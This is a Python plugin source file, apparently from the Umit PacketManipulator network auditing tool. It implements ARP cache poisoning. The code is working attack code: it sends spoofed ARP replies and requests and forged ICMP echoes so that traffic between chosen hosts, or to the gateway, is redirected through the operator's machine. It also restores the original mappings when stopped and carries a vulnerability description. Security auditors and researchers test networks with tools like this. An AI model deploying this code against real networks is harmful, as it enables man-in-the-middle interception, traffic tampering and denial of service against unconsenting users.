#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (C) 2008 Adriano Monteiro Marques
#
# Author: Francesco Piccinno <stack.box@gmail.com>
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307 USA

import gtk
import time
import gobject

from threading import Thread
from socket import gethostbyname

from umit.pm.core.i18n import _
from umit.pm.core.logger import log
from umit.pm.core.netconst import *
from umit.pm.core.auditutils import is_ip, is_mac
from umit.pm.core.const import STATUS_ERR

from umit.pm.gui.core.app import PMApp
from umit.pm.gui.plugins.core import Core
from umit.pm.gui.plugins.engine import Plugin
from umit.pm.manager.auditmanager import *

from umit.pm.backend import MetaPacket

AUDIT_NAME = 'arp-cache-poison'
AUDIT_MSG = '<tt><b>' + AUDIT_NAME + ':</b> %s</tt>'

ARP_REQUEST = 1
ARP_REPLY   = 2

ping_payload = "\x82\x02\x2d\x4b\x6e\x4f\x03\x00\x08\x09\x0a\x0b\x0c\x0d\x0e" \
               "\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d" \
               "\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c" \
               "\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37"


class PoisonOperation(AuditOperation):
    has_stop = True
    has_start = True

    def __init__(self, sess, status, oneway, poison_equal_mac, icmp, \
                 request, first, second):
        AuditOperation.__init__(self)

        self.percentage = 0

        self.thread = Thread(target=self.__main, name=AUDIT_NAME)
        self.thread.setDaemon(True)
        self.internal = False
        self.summary = AUDIT_MSG % _('Waiting for inputs')

        self.session = sess
        self.oneway = oneway
        self.poison_equal_mac = poison_equal_mac
        self.force_icmp = icmp
        self.arp_request = request

        self.first_timeout = first
        self.second_timeout = second

        self.status = status
        self.status.set_sensitive(False)
        sess.mitm_attacks.append(AUDIT_NAME)

    def start(self):
        if self.state == self.RUNNING or self.internal:
            return False

        if not self.session.target_page.create_targets():
            self.summary = AUDIT_MSG % _('No targets')
            self.internal = False
            self.state = self.NOT_RUNNING

            return False

        else:
            self.summary = AUDIT_MSG % _('Running...')
            self.internal = True
            self.state = self.RUNNING

            self.thread.start()

            return True

    def stop(self):
        if self.state == self.NOT_RUNNING or not self.internal:
            return False

        self.summary = AUDIT_MSG % _('Stopping...')
        self.internal = False

        self.status.set_sensitive(True)
        self.session.mitm_attacks.remove(AUDIT_NAME)

        return True

    def send_arp(self, ctx, type, sip, smac, dip, dmac):
        mpkt = MetaPacket.new('eth') / MetaPacket.new('arp')
        mpkt.set_field('eth.dst', dmac)

        if type == ARP_REQUEST:
            dmac = '00:00:00:00:00:00'

        mpkt.set_field('arp.op', type)
        mpkt.set_field('arp.hwsrc', smac)
        mpkt.set_field('arp.hwdst', dmac)
        mpkt.set_field('arp.psrc', sip)
        mpkt.set_field('arp.pdst', dip)

        #log.info(mpkt.summary())
        #log.info('Sending %s (%s -> %s) [%s -> %s]' % (
        #    type == ARP_REQUEST and 'who-has' or 'is-at',
        #    sip, dip, smac, dmac))

        ctx.si_l2(mpkt)

    def send_icmp_echo(self, ctx, sip, dip, smac, dmac):
        mpkt = MetaPacket.new('eth') / \
             MetaPacket.new('ip') /    \
             MetaPacket.new('icmp') /  \
             MetaPacket.new('raw')

        mpkt.set_field('eth.dst', dmac)
        mpkt.set_field('eth.src', smac)
        mpkt.set_field('ip.src', sip)
        mpkt.set_field('ip.dst', dip)
        mpkt.set_field('raw.load', ping_payload)

        #log.info(mpkt.summary())
        #log.info('Sending ICMP echo (%s -> %s) [%s -> %s]' % (
        #    sip, dip, smac, dmac))

        ctx.si_l2(mpkt)

    def __main(self):
        index = 0
        mac = self.session.context.get_mac1()

        while self.internal:

            for target1 in self.session.target_page.get_targets1():
                for target2 in self.session.target_page.get_targets2():

                    # Equal IP must be skipped
                    if target1.l3_addr and \
                       target1.l3_addr == target2.l3_addr:
                        continue

                    if not self.poison_equal_mac and \
                       target1.l2_addr and target1.l2_addr == target2.l2_addr:
                        continue

                    if index == 0 and self.force_icmp:
                        self.send_icmp_echo(self.session.context,
                                            target2.l3_addr,
                                            target1.l3_addr,
                                            target1.l2_addr, mac)

                        if not self.oneway:
                            self.send_icmp_echo(self.session.context,
                                                target1.l3_addr,
                                                target2.l3_addr,
                                                target2.l2_addr, mac)

                    # Effective attack.
                    self.send_arp(self.session.context, ARP_REPLY,
                                  target2.l3_addr, mac,
                                  target1.l3_addr, target1.l2_addr)

                    if not self.oneway:
                        self.send_arp(self.session.context, ARP_REPLY,
                                      target1.l3_addr, mac,
                                      target2.l3_addr, target2.l2_addr)

                    # Sending request
                    if self.arp_request:
                        self.send_arp(self.session.context, ARP_REQUEST,
                                      target2.l3_addr, mac,
                                      target1.l3_addr, target1.l2_addr)

                        if not self.oneway:
                            self.send_arp(self.session.context, ARP_REQUEST,
                                          target1.l3_addr, mac,
                                          target2.l3_addr, target2.l2_addr)

                    time.sleep(self.first_timeout)

            if index < 5:
                time.sleep(self.first_timeout)
                index += 1
            else:
                time.sleep(self.second_timeout)

            self.percentage = (self.percentage + 536870911) % \
                              gobject.G_MAXINT

        # Stop here
        self.summary = AUDIT_MSG % _('Restoring previous associations')

        for index in xrange(3):

            for target1 in self.session.target_page.get_targets1():
                for target2 in self.session.target_page.get_targets2():

                    # Equal IP must be skipped
                    if target1.l3_addr and \
                       target1.l3_addr == target2.l3_addr:
                        continue

                    if not self.poison_equal_mac and \
                       target1.l2_addr and target1.l2_addr == target2.l2_addr:
                        continue

                    # Effective attack.
                    self.send_arp(self.session.context, ARP_REPLY,
                                  target2.l3_addr, target2.l2_addr,
                                  target1.l3_addr, target1.l2_addr)

                    if not self.oneway:
                        self.send_arp(self.session.context, ARP_REPLY,
                                      target1.l3_addr, target1.l2_addr,
                                      target2.l3_addr, target2.l2_addr)

                    # Sending request
                    if self.arp_request:
                        self.send_arp(self.session.context, ARP_REQUEST,
                                      target2.l3_addr, target2.l2_addr,
                                      target1.l3_addr, target1.l2_addr)

                        if not self.oneway:
                            self.send_arp(self.session.context, ARP_REQUEST,
                                          target1.l3_addr, target1.l2_addr,
                                          target2.l3_addr, target2.l2_addr)

                    time.sleep(self.first_timeout)

        self.percentage = 100.0
        self.summary = AUDIT_MSG % _('Stopped')
        self.state = self.NOT_RUNNING
        self.internal = False

class ARPMitm(Plugin, ActiveAudit):
    __inputs__ = (
        ('oneway', (False, _('Poison one way'))),
        ('poison_equal_mac', (True, _('Poison targets with equal MAC'))),
        ('icmp', (True, 'Use spoofed ICMP echo request to force mapping')),
        ('request', (False, 'Also send crafted ARP request packets')),
        ('first_stage', (1, 'First stage timeout (> 1)')),
        ('second_stage', (10, 'Second stage timeout (> 1)')),
    )

    def start(self, reader):
        a, self.status = self.add_mitm_attack(AUDIT_NAME,
                                              'ARP cache poison',
                                              _('Poison the ARP cache.'),
                                              gtk.STOCK_REFRESH)

    def stop(self):
        self.remove_mitm_attack(self.status)

    def execute_audit(self, sess, inp_dict):
        if AUDIT_NAME in sess.mitm_attacks:
            return

        if sess.context.get_datalink() not in \
           (IL_TYPE_ETH, IL_TYPE_TR, IL_TYPE_FDDI):

            sess.output_page.user_msg(_('Unsupported datalink'), STATUS_ERR,
                                      AUDIT_NAME)
            return

        return PoisonOperation(sess, self.status,
                               inp_dict['oneway'],
                               inp_dict['poison_equal_mac'],
                               inp_dict['icmp'],
                               inp_dict['request'],
                               inp_dict['first_stage'],
                               inp_dict['second_stage'])

class ARPCachePoison(Plugin, ActiveAudit):
    __inputs__ = (
        ('host', ('0.0.0.0', _('The host you wish to intercept packets for'
                             ' (usually the local gateway)'))),
        ('target', ('0.0.0.0', _('Optional: IP address of a particular host '
                                 'to ARP poison. (if not specified, all the '
                                 'hosts on the LAN)'))),
        ('hwsrc', ('', _('The source MAC address (leave it empty and will be '
                         'automatically filled with the MAC of your NIC'))),
        ('packets', (0, _('Number of packets to send. 0 for infinite'))),
        ('delay', (300, _('Delay in msec between consecutive sends'))),
    )

    def start(self, reader):
        self.status = PMApp().main_window.get_tab('StatusTab').status

        a, self.item = self.add_menu_entry('ARPPoison', 'ARP cache poisoning ...',
                                           _('Poison the ARP cache of an host.'),
                                           gtk.STOCK_EXECUTE)

    def stop(self):
        self.remove_menu_entry(self.item)

    def on_resolved(self, send, mpkt, reply, udata):
        hwdst = reply.get_field('arp.hwsrc')
        sess, host, target, hwsrc, packets, delay = udata

        self.status.info(_('IP %s is-at %s') % (reply.get_field('arp.pdst'), hwsrc))

        self.poison(sess, host, target, hwsrc, hwdst, packets, delay)

    def on_error(self, send, status, udata):
        if udata:
            self.status.warning(_('Unable to resolve %s (Errno: %d)') \
                                % (send.mpkts[0].get_field('arp.pdst'), status))

    def execute_audit(self, sess, inp_dict):
        datalink = sess.context.datalink()

        if datalink not in (IL_TYPE_ETH, IL_TYPE_TR, IL_TYPE_FDDI):
            self.status.error(_('Could not run arpcachepoison. Datalink '
                                'not supported. Ethernet needed.'))
            return False

        host = inp_dict['host']
        hwsrc = inp_dict['hwsrc']
        target = inp_dict['target']
        packets = inp_dict['packets']
        delay = max(300, inp_dict['delay'])

        if packets <= 0:
            packets = -1

        if not is_ip(host):
            self.status.error(_('Not a valid IP address for host'))
            return False

        if not is_ip(target):
            self.status.error(_('Not a valid IP address for target'))
            return False

        if hwsrc and not is_mac(hwsrc):
            self.status.error(_('Not a valid MAC address for hwsrc'))
            return False

        if target != '0.0.0.0':
            # We have to solve the IP as MAC address
            pkt = MetaPacket.new('arp')

            pkt.set_field('arp.pdst', target)

            sess.context.sr_l3(pkt, timeout=4,
                               onerror=self.on_error,
                               onreply=self.on_resolved,
                               udata=(sess, host, target, hwsrc, packets, delay))

            self.status.info(_('Trying to resolve IP: %s') % target)
        else:
            self.poison(sess, host, target, hwsrc, '', packets, delay)

        return True

    def poison(self, sess, host, target, hwsrc, hwdst, packets, delay):
        pkt = MetaPacket.new('eth') / MetaPacket.new('arp')

        if hwdst:
            pkt.set_field('eth.dst', hwdst)
            pkt.set_field('arp.hwdst', hwdst)
        else:
            pkt.set_field('arp.hwdst', 'ff:ff:ff:ff:ff:ff')

        pkt.set_field('arp.op', 'is-at')
        pkt.set_field('arp.psrc', host)
        pkt.set_field('arp.pdst', target)

        if hwsrc:
            pkt.set_field('arp.hwsrc', hwsrc)

        self.status.info(_('Starting ARP cache poison against %s '
                           '(capturing packets directed to %s)') % (target, host))

        send = sess.context.s_l2(pkt, repeat=packets, delay=delay)

__plugins__ = [ARPCachePoison, ARPMitm]
__plugins_deps__ = []

__audit_type__ = 1
__protocols__ = (('arp', None), )
__vulnerabilities__ = (('ARP cache poison', {
    'description' : 'Address Resolution Protocol (ARP) spoofing, also known as '
                    'ARP poisoning or ARP Poison Routing (APR), is a technique '
                    'used to attack an Ethernet wired or wireless network. ARP '
                    'Spoofing may allow an attacker to sniff data frames on a '
                    'local area network (LAN), modify the traffic, or stop the '
                    'traffic altogether (known as a denial of service attack). '
                    'The attack can only be used on networks that actually '
                    'make use of ARP and not another method of address '
                    'resolution.\n\n'
                    'The principle of ARP spoofing is to send fake, or '
                    '"spoofed", ARP messages to an Ethernet LAN. Generally, '
                    'the aim is to associate the attacker\'s MAC address with '
                    'the IP address of another node (such as the default '
                    'gateway). Any traffic meant for that IP address would be '
                    'mistakenly sent to the attacker instead. The attacker '
                    'could then choose to forward the traffic to the actual '
                    'default gateway (passive sniffing) or modify the data '
                    'before forwarding it (man-in-the-middle attack). The '
                    'attacker could also launch a denial-of-service attack '
                    'against a victim by associating a nonexistent MAC address '
                    'to the IP address of the victim\'s default gateway.\n\n'
                    'ARP spoofing attacks can be run from a compromised host, '
                    'or from an attacker\'s machine that is connected directly '
                    'to the target Ethernet segment.',
    'references' : ((None, 'http://en.wikipedia.org/wiki/ARP_spoofing'),)
    }),
)

